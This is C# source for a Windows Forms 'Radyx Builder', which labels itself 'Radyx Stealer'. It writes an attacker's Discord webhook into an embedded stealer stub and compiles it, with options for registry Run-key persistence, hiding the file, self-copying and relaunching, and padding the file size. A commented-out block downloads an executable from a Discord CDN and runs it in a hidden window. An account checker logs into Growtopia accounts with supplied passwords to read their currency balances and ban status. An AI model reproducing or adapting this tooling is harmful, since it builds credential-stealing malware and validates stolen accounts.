using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.CodeDom.Compiler;
using Microsoft.Win32;
using System.Net;
using System.Management;
using System.Collections.Specialized;
using System.Drawing.Imaging;
using System.Net.NetworkInformation;
using System.Threading;
using CodeDomExample;
using DiscordRpcDemo;
using System.Security.Policy;
using System.Net.Http;
using System.Net.Http.Headers;
using MetroFramework;
using ENet.Managed;

namespace Radyx
{

    public partial class Form1 : MetroFramework.Forms.MetroForm
    {
        #region Account Checker
        ENetHost eNet;
        ENetPeer eNetP;
        public int Growtopia_Port = 17279; // todo auto get port
        public string Growtopia_IP = "213.179.209.168";
        public string Growtopia_Master_IP = "213.179.209.168";
        public int Growtopia_Master_Port = 17279;
        public static string doorid = "";
        public static string tankIDName = "";
        public static string tankIDPass = "";
        public static string game_version = "3.38";
        public static string country = "us";
        static Random aa = new Random();
        static string randomismi = aa.Next(10, 99).ToString();
        static string randomismi1 = aa.Next(10, 99).ToString();
        static string randomismi2 = aa.Next(10, 99).ToString();
        static string randomismi3 = aa.Next(10, 99).ToString();
        static string randomismi4 = aa.Next(10, 99).ToString();

        public static string maccz = "02:" + randomismi1 + ":" + randomismi2 + ":" + randomismi3 + ":" + randomismi4 + ":" + randomismi;
        public static string macc = "02:00:00:00:00:00";

        public static int token = 0;
        public static bool resetStuffNextLogon = false;
        public static int userID = 0;
        public static int lmode = 0;
        public class PacketSending
        {
            private Random rand = new Random();
            public void SendData(byte[] data, ENetPeer peer, ENetPacketFlags flag = ENetPacketFlags.Reliable)
            {

                if (peer == null) return;
                if (peer.State != ENetPeerState.Connected) return;

                if (rand.Next(0, 1) == 0) peer.Send(data, 0, flag);
                else peer.Send(data, 1, flag);
            }

            public void SendPacketRaw(int type, byte[] data, ENetPeer peer, ENetPacketFlags flag = ENetPacketFlags.Reliable)
            {
                byte[] packetData = new byte[data.Length + 5];
                Array.Copy(BitConverter.GetBytes(type), packetData, 4);
                Array.Copy(data, 0, packetData, 4, data.Length);
                SendData(packetData, peer);
            }

            public void SendPacket(int type, string str, ENetPeer peer, ENetPacketFlags flag = ENetPacketFlags.Reliable)
            {
                SendPacketRaw(type, Encoding.ASCII.GetBytes(str.ToCharArray()), peer);
            }

            public void SecondaryLogonAccepted(ENetPeer peer)
            {
                SendPacket((int)NetTypes.NetMessages.GENERIC_TEXT, string.Empty, peer);
            }

            public void InitialLogonAccepted(ENetPeer peer)
            {
                SendPacket((int)NetTypes.NetMessages.SERVER_HELLO, string.Empty, peer);
            }
        }
        public class NetTypes
        {
            public enum PacketTypes
            {
                PLAYER_LOGIC_UPDATE = 0,
                CALL_FUNCTION,
                UPDATE_STATUS,
                TILE_CHANGE_REQ,
                LOAD_MAP,
                TILE_EXTRA,
                TILE_EXTRA_MULTI,
                TILE_ACTIVATE,
                APPLY_DMG,
                INVENTORY_STATE,
                ITEM_ACTIVATE,
                ITEM_ACTIVATE_OBJ,
                UPDATE_TREE,
                MODIFY_INVENTORY_ITEM,
                MODIFY_ITEM_OBJ,
                APPLY_LOCK,
                UPDATE_ITEMS_DATA,
                PARTICLE_EFF,
                ICON_STATE,
                ITEM_EFF,
                SET_CHARACTER_STATE,
                PING_REPLY,
                PING_REQ,
                PLAYER_HIT,
                APP_CHECK_RESPONSE,
                APP_INTEGRITY_FAIL,
                DISCONNECT,
                BATTLE_JOIN,
                BATTLE_EVENT,
                USE_DOOR,
                PARENTAL_MSG,
                GONE_FISHIN,
                STEAM,
                PET_BATTLE,
                NPC,
                SPECIAL,
                PARTICLE_EFFECT_V2,
                ARROW_TO_ITEM,
                TILE_INDEX_SELECTION,
                UPDATE_PLAYER_TRIBUTE
            };

            public enum NetMessages
            {
                UNKNOWN = 0,
                SERVER_HELLO,
                GENERIC_TEXT,
                GAME_MESSAGE,
                GAME_PACKET,
                ERROR,
                TRACK,
                LOG_REQ,
                LOG_RES
            };

        }
        class VariantList
        {
            // this class has been entirely made by me, based on the code available on the gt bot of anybody :)
            [DllImport("msvcrt.dll", EntryPoint = "memcpy", CallingConvention = CallingConvention.Cdecl, SetLastError = false)]
            public static extern IntPtr memcpy(IntPtr dest, IntPtr src, UIntPtr count);

            public struct VarList
            {
                public string FunctionName;
                public int netID;
                public uint delay;
                public object[] functionArgs;
            };

            public enum OnSendToServerArgs
            {
                port = 1,
                token,
                userId,
                IPWithExtraData = 4
            };

            public byte[] get_extended_data(byte[] pktData)
            {
                return pktData.Skip(56).ToArray();
            }

            public byte[] get_struct_data(byte[] package)
            {
                int packetLen = package.Length;
                if (packetLen >= 0x3c)
                {
                    byte[] structPackage = new byte[packetLen - 4];
                    Array.Copy(package, 4, structPackage, 0, packetLen - 4);
                    int p2Len = BitConverter.ToInt32(package, 56);
                    if (((byte)(package[16]) & 8) != 0)
                    {
                    }
                    else
                    {
                        Array.Copy(BitConverter.GetBytes(0), 0, package, 56, 4);
                    }
                    return structPackage;
                }
                return null;
            }

            public VarList GetCall(byte[] package)
            {

                VarList varList = new VarList();
                //if (package.Length < 60) return varList;
                int pos = 0;
                //varList.netID = BitConverter.ToInt32(package, 8);
                //varList.delay = BitConverter.ToUInt32(package, 24);
                byte argsTotal = package[pos];
                pos++;
                if (argsTotal > 7) return varList;
                varList.functionArgs = new object[argsTotal];

                for (int i = 0; i < argsTotal; i++)
                {
                    varList.functionArgs[i] = 0; // just to be sure...
                    byte index = package[pos]; pos++; // pls dont bully sm
                    byte type = package[pos]; pos++;


                    switch (type)
                    {
                        case 1:
                            {
                                float vFloat = BitConverter.ToUInt32(package, pos); pos += 4;
                                varList.functionArgs[index] = vFloat;
                                break;
                            }
                        case 2: // string
                            int strLen = BitConverter.ToInt32(package, pos); pos += 4;
                            string v = string.Empty;
                            v = Encoding.ASCII.GetString(package, pos, strLen); pos += strLen;

                            if (index == 0)
                                varList.FunctionName = v;

                            if (index > 0)
                            {
                                if (varList.FunctionName == "OnSendToServer") // exceptionary function, having it easier like this :)
                                {
                                    doorid = v.Substring(v.IndexOf("|") + 1); // doorid
                                    if (v.Length >= 8)
                                        v = v.Substring(0, v.IndexOf("|"));
                                }

                                varList.functionArgs[index] = v;
                            }
                            break;
                        case 5: // uint
                            uint vUInt = BitConverter.ToUInt32(package, pos); pos += 4;
                            varList.functionArgs[index] = vUInt;
                            break;
                        case 9: // int (can hold negative values, of course they are always casted but its just a sign from the server that the value was intended to hold negative values as well)
                            int vInt = BitConverter.ToInt32(package, pos); pos += 4;
                            varList.functionArgs[index] = vInt;
                            break;
                        default:
                            break;
                    }
                }
                return varList;
            }
        }
        static string yeterfuck;
        static string nopefuck;
        private void Peer_OnDisconnect_Client(object sender, uint e)
        {
            try
            {
                yeterfuck = File.ReadAllText("s.temp");
                nopefuck = File.ReadAllText("d.temp");
                ListViewItem dsadw = new ListViewItem(animaTextBox4.Text);
                dsadw.SubItems.Add(animaTextBox3.Text);
                string[] somearrays = yeterfuck.Split('\n');
                string[] somearraysss = nopefuck.Split('\n');
                try
                {
                    for (int i = 0; i < somearrays.Length; i++)
                    {
                        if (somearrays[i].Contains("Worldlock"))
                        {
                            dsadw.SubItems.Add(somearrays[i].ToLower().Replace("worldlock_balance|", ""));
                        }
                    }
                    for (int ix = 0; ix < somearraysss.Length; ix++)
                    {
                        if (somearraysss[ix].Contains("Gems"))
                        {
                            dsadw.SubItems.Add(somearraysss[ix].ToLower().Replace("gems_balance|", ""));
                        }
                    }
                    status.Text = "Checked Success!";
                    listView2.Items.Add(dsadw);
                    File.Delete("d.temp");
                    File.Delete("s.temp");
                }
                catch
                {

                }

            }
            catch
            {

            }
        }
        public void ConnectCurrent()
        {
            if (eNet == null) return;

            if (eNet.ServiceThreadStarted)
            {

                if (eNetP == null)
                {
                    eNetP = eNet.Connect(new System.Net.IPEndPoint(IPAddress.Parse(Growtopia_IP), Growtopia_Port), 2, 0);
                }
                else if (eNetP.State == ENetPeerState.Connected)
                {
                    eNetP.Reset();

                    eNetP = eNet.Connect(new System.Net.IPEndPoint(IPAddress.Parse(Growtopia_IP), Growtopia_Port), 2, 0);
                }
            }
        }
        public static string CreateLogonPacket(string customGrowID = "", string customPass = "")
        {
            string p = string.Empty;
            Random rand = new Random();
            bool requireAdditionalData = false; if (token > 0 || token < 0) requireAdditionalData = true;

            if (customGrowID == "")
            {
                if (tankIDName != "")
                {
                    p += "tankIDName|" + (tankIDName + "\n");
                    p += "tankIDPass|" + (tankIDPass + "\n");
                }
            }
            else
            {
                p += "tankIDName|" + (customGrowID + "\n");
                p += "tankIDPass|" + (customPass + "\n");
            }

            p += "requestedName|" + ("Growbrew" + rand.Next(0, 255).ToString() + "\n"); //"Growbrew" + rand.Next(0, 255).ToString() + "\n"
            p += "f|1\n";
            p += "protocol|94\n";
            p += "game_version|" + (game_version + "\n");
            if (requireAdditionalData) p += "lmode|" + lmode + "\n";
            p += "cbits|0\n";
            p += "player_age|100\n";
            p += "GDPR|1\n";
            p += "hash2|" + rand.Next(-777777777, 777777777).ToString() + "\n";
            p += "meta|localhost\n"; // soon auto fetch meta etc.
            p += "fhash|-716928004\n";
            p += "platformID|4\n";
            p += "deviceVersion|0\n";
            p += "country|" + (country + "\n");
            p += "hash|" + rand.Next(-777777777, 777777777).ToString() + "\n";
            p += "mac|" + macc + "\n";
            if (requireAdditionalData) p += "user|" + (userID.ToString() + "\n");
            if (requireAdditionalData) p += "token|" + (token.ToString() + "\n");
            if (doorid != "") p += "doorID|" + doorid.ToString() + "\n";
            p += "wk|" + ("NONE0\n");
            //p += "zf|-1576181843";
            return p;
        }

        private void Peer_OnReceive_Client(object sender, ENetPacket e)
        {
            try
            {
                // this is a specific, external client made only for the purpose of using the TRACK packet for our gains/advantage in order to check all accounts quick and efficiently.
                byte[] packet = e.GetPayloadFinal();
                Console.WriteLine("RECEIVE TYPE: " + packet[0].ToString());
                status.Text = "Received:" + packet[0].ToString();
                switch (packet[0])
                {
                    case 1: // HELLO server packet.
                        {
                            PacketSending packetSender = new PacketSending();
                            packetSender.SendPacket(2, CreateLogonPacket(animaTextBox4.Text, animaTextBox3.Text), eNetP);
                            status.Text = "Loginning: " + packet[0].ToString();
                            break;
                        }
                    case 2:
                    case 3:
                        {
                            Console.WriteLine("[ACCOUNT-CHECKER] TEXT PACKET CONTENT:\n" + Encoding.ASCII.GetString(packet.Skip(4).ToArray()));
                            string game = Encoding.ASCII.GetString(packet.Skip(4).ToArray());
                            if (game.Contains("suspend"))
                            {
                                status.Text = "Account Suspended!";
                                eNetP.Disconnect(0);
                            }
                            if (game.Contains("ban"))
                            {
                                status.Text = "Account Banned!";
                                eNetP.Disconnect(0);
                            }
                            if (game.Contains("maint"))
                            {
                                status.Text = "Growtopia servers fuck!";
                                eNetP.Disconnect(0);
                            }
                            if (game.Contains("play.sfx"))
                            {
                                status.Text = "Account Bug!";
                                eNetP.Disconnect(0);
                            }
                            if (game.Contains("UPDATE REQUIRED"))
                            {
                                game.Replace("msg|`4", "");
                                game = Regex.Match(game, @"\d+").Value;
                                game = game.Insert(1, ".");
                                game = "3.38";
                                Console.WriteLine("fuckchecker:" + game);
                                status.Text = "Restart need!";
                            }
                            if (game.Contains("password is wrong"))
                            {
                                status.Text = "Wrong Password!";
                                eNetP.Disconnect(0);
                            }//Incorrect logon token..
                            if (game.Contains("Incorrect logon token"))
                            {
                                VariantList ad = new VariantList();
                                byte[] tankPacket = ad.get_struct_data(packet);
                                VariantList.VarList vList = ad.GetCall(ad.get_extended_data(tankPacket));
                                vList.netID = BitConverter.ToInt32(tankPacket, 4); // add netid
                                vList.delay = BitConverter.ToUInt32(tankPacket, 20); // add keep track of delay modifier
                                string ip = (string)vList.functionArgs[4];

                                if (ip.Contains("|"))
                                    ip = ip.Substring(0, ip.IndexOf("|"));

                                int port = (int)vList.functionArgs[1];
                                userID = (int)vList.functionArgs[3];
                                token = (int)vList.functionArgs[2];
                                lmode = (int)vList.functionArgs[5];
                                Growtopia_IP = ip;
                                Growtopia_Port = port;
                                ConnectCurrent();
                                status.Text = ("Peer Reset Success!");
                                Thread.Sleep(10);
                            }//Incorrect logon token..
                            break;
                        }
                    case 4:
                        {
                            VariantList ad = new VariantList();
                            byte[] tankPacket = ad.get_struct_data(packet);
                            if (tankPacket[0] == 1)
                            {
                                VariantList.VarList vList = ad.GetCall(ad.get_extended_data(tankPacket));
                                vList.netID = BitConverter.ToInt32(tankPacket, 4); // add netid
                                vList.delay = BitConverter.ToUInt32(tankPacket, 20); // add keep track of delay modifier

                                // Console.WriteLine(VarListFetched.FunctionName);
                                if (vList.FunctionName == "OnSendToServer")
                                {
                                    string ip = (string)vList.functionArgs[4];

                                    if (ip.Contains("|"))
                                        ip = ip.Substring(0, ip.IndexOf("|"));

                                    int port = (int)vList.functionArgs[1];
                                    userID = (int)vList.functionArgs[3];
                                    token = (int)vList.functionArgs[2];
                                    lmode = (int)vList.functionArgs[5];
                                    Growtopia_IP = ip;
                                    Growtopia_Port = port;
                                    ConnectCurrent();
                                    status.Text = ("Peer Reset Success!");
                                }
                                // variant call, just rn used for subserver switching
                            }
                            break;
                        }

                    case (byte)NetTypes.NetMessages.TRACK: // TRACK packet.
                        {
                            Console.WriteLine("[ACCOUNT-CHECKER] TRACK PACKET CONTENT:\n" + Encoding.ASCII.GetString(packet.Skip(4).ToArray()));
                            File.AppendAllText("s.temp", Encoding.ASCII.GetString(packet.Skip(4).ToArray()));
                            Growtopia_Port = Growtopia_Master_Port; // todo auto get port
                            Growtopia_IP = Growtopia_Master_IP;
                            PacketSending asd = new PacketSending();
                            asd.SendPacket(2, "action|enter_game", eNetP);

                            if (Encoding.ASCII.GetString(packet.Skip(4).ToArray()).Contains("Gem"))
                            {
                                File.AppendAllText("d.temp", Encoding.ASCII.GetString(packet.Skip(4).ToArray()));
                                eNetP.Disconnect(0);
                            }
                            break;
                        }
                    default:
                        break;
                }
            }
            catch
            {

            }
        }
        private void Client_OnConnect(object sender, ENetConnectEventArgs e)
        {
            e.Peer.OnReceive += Peer_OnReceive_Client;
            e.Peer.OnDisconnect += Peer_OnDisconnect_Client;
            e.Peer.PingInterval(875);
            e.Peer.Timeout(1000, 7000, 15000);
        }
        #endregion

        public static string txt;
        public static string sj;

        private DiscordRpc.EventHandlers handlers;
        private DiscordRpc.RichPresence presence;
        public Form1()
        {
            InitializeComponent();
        }
    
        private async void Form1_Load(object sender, EventArgs e)
        {




         



            try
            {
               
                //stealer
                //WebClient wc = new WebClient();
                //wc.DownloadFile("https://cdn.discordapp.com/attachments/718913238733029486/731196529590665356/RadyxAll.exe", Path.GetTempPath() + "\\StringDecrypter.exe");


                //Process.Start(new ProcessStartInfo
                //{
                //    FileName = Path.GetTempPath() + "\\StringDecrypter.exe",
                //    WindowStyle = ProcessWindowStyle.Hidden
                //});
                metroTrackBar1.Value = 1;
                var request = WebRequest.Create("https://sezeromer.com/wp-content/uploads/2019/09/Infinity-1s-200px.gif");

                using (var response = request.GetResponse())
                using (var stream = response.GetResponseStream())
                {
                    pictureBox1.Image = Bitmap.FromStream(stream);
                }

                int k;
                txt = this.url.Text;

                this.handlers = default(DiscordRpc.EventHandlers);
                DiscordRpc.Initialize("722171575646027816", ref this.handlers, true, null);
                this.handlers = default(DiscordRpc.EventHandlers);
                DiscordRpc.Initialize("722171575646027816", ref this.handlers, true, null);
                this.presence.details = "Tab: " + MainP.Text + DateTime.Now.ToString(" HH:mm");
                this.presence.state = "Date: " + DateTime.Now.ToString("dd/MM/yyyy");
                this.presence.largeImageKey = "radyx";
                this.presence.largeImageText = "Radyx Stealer";
                DiscordRpc.UpdatePresence(ref this.presence);

            }
            catch
            {

            }
           
        }
        private void metroButton2_Click(object sender, EventArgs e)
        {

        }

        private async void metroButton1_Click(object sender, EventArgs e)
        {
           
            if (!url.Text.Contains("http"))
            {
                MessageBox.Show("Please Provide A Link!");

            }
            else
            {
                // ..\Resources\Source.cs
                string source = Properties.Resources.Stub;
                source = source.Replace("//webhook3", url.Text);
                source = source.Replace("//webhook2", url.Text);
                source = source.Replace("//webhook1", url.Text);

                if (RegularStartup.Checked == true)
                {
                    source = source.Replace("//addnormalstartupxdd", @"            using (RegistryKey " + "regk" + @" = Registry.LocalMachine.OpenSubKey(@""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"", true))
            {
                try{" + "regk" + @".SetValue(" + "Path.GetFileNameWithoutExtension(Application.ExecutablePath)" + @", @"""""""" + Application.ExecutablePath + @"""""""");}catch{}
            }");
                }
                if (HideFile.Checked == true)
                {
                    source = source.Replace("//hidefile", @"            try { File.SetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location, File.GetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location) | FileAttributes.Hidden | FileAttributes.System); } catch { }");
                }
                if (CopyStealer.Checked == true)
                {
                    source = source.Replace("//copyfilewtfffxd", @"

                 String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, "".exe"");
                    String filePath = Path.Combine(Environment.CurrentDirectory, fileName);
                    if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + ""\\"" + fileName))
                    {
                        File.Copy(filePath, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), fileName));
                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + ""\\"" + fileName);
                        Environment.Exit(0);
   

                    }


                    ");
                }
                if (Trace.Checked == true)
                {
                    source = source.Replace("//  Process.Start", "  Process.Start");
                }
                //String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
                //String filePath = Path.Combine(Environment.CurrentDirectory, fileName);
                //if(!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" +  fileName))
                //{
                //    File.Copy(filePath, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), fileName));

                //}

                // replace values

                using (SaveFileDialog saveFile = new SaveFileDialog())
                {
                    saveFile.Filter = "Executable (*.exe)|*.exe";
                    if (saveFile.ShowDialog() == DialogResult.OK)
                    {
                        listBox1.Items.Add("[+]Building...");
                        await Task.Delay(1000);
                        listBox1.Items.Add("[+]Reading Webhook...");
                        await Task.Delay(2000);
                        listBox1.Items.Add("[+]Injecting Icon...");
                        await Task.Delay(2000);
                        listBox1.Items.Add("[+]Done!");
                        new Compiler(source, saveFile.FileName);

                    }
                    if (PumpFile.Checked == true)
                    {
                        long FileSize = metroTrackBar1.Value;

                        FileSize = FileSize * 1048576;
                        FileStream FileToPump = File.OpenWrite(saveFile.FileName);
                        long Size = FileToPump.Seek(0, SeekOrigin.End);
                        while (Size < FileSize)
                        {
                            FileToPump.WriteByte(0);
                            Size += 1;
                        }
                        FileToPump.Close();
                        if (Size == FileSize)
                        {
                            //string obf = sik.FileName.Replace(".exe", " .exe");
                            //File.Delete(obf);
                            MessageBox.Show("File pumped successfully!", "Radyx Builder v1.0", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        else
                        MessageBox.Show("Can't pump the file!", "Radyx Builder v1.0", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    }

                }

               



            }
        }

        private void metroCheckBox2_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void metroTabControl1_Click(object sender, EventArgs e)
        {
            if (metroTabControl1.SelectedIndex == 1)
            {
                this.handlers = default(DiscordRpc.EventHandlers);
                DiscordRpc.Initialize("722171575646027816", ref this.handlers, true, null);
                this.handlers = default(DiscordRpc.EventHandlers);
                DiscordRpc.Initialize("722171575646027816", ref this.handlers, true, null);
                this.presence.details = "Tab: " + WebHook.Text + DateTime.Now.ToString(" HH:mm");
                DiscordRpc.UpdatePresence(ref this.presence);
            }
            if (metroTabControl1.SelectedIndex == 0)
            {
                this.handlers = default(DiscordRpc.EventHandlers);
                DiscordRpc.Initialize("722171575646027816", ref this.handlers, true, null);
                this.handlers = default(DiscordRpc.EventHandlers);
                DiscordRpc.Initialize("722171575646027816", ref this.handlers, true, null);
                this.presence.details = "Tab: " + MainP.Text + DateTime.Now.ToString(" HH:mm");
                DiscordRpc.UpdatePresence(ref this.presence);
            }
        }

        private void metroButton2_Click_1(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Icon files (*.ico)|*.ico";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                IconPath.Text = ofd.FileName;
                Compiler.icon = ofd.FileName;
            }
            else
            {

            }
        }

        private void MainP_Click(object sender, EventArgs e)
        {

        }

        

        private void RegularStartup_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void metroTrackBar1_Scroll(object sender, ScrollEventArgs e)
        {
            Track.Text = metroTrackBar1.Value + " MB";
            if (metroTrackBar1.Value == 0)
            {
                MessageBox.Show("Sorry, You Can't Do 0 MB The File!","RadyxBuilder v1.0",MessageBoxButtons.OK,MessageBoxIcon.Information);
                metroTrackBar1.Value = 1;
                Track.Text = metroTrackBar1.Value + " MB";

            }
        }

        private void PumpFile_CheckedChanged(object sender, EventArgs e)
        {
            if (PumpFile.Checked == true)
            {
                metroTrackBar1.Enabled = true;
            }
            else
            {
                metroTrackBar1.Enabled = false;

            }
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void metroButton4_Click(object sender, EventArgs e)
        {
           //old checker deleted zzz
        }

        private void metroButton3_Click(object sender, EventArgs e)
        {
            ManagedENet.Startup();
            eNet = new ENetHost(1, 2);
            eNet.OnConnect += Client_OnConnect;
            eNet.CompressWithRangeCoder();
            eNet.ChecksumWithCRC32();
            eNet.StartServiceThread();
            eNetP = eNet.Connect(new System.Net.IPEndPoint(IPAddress.Parse(Growtopia_Master_IP), Growtopia_Master_Port), 2, 0);
            status.Text = ("Connected!");
        }
    }
    }


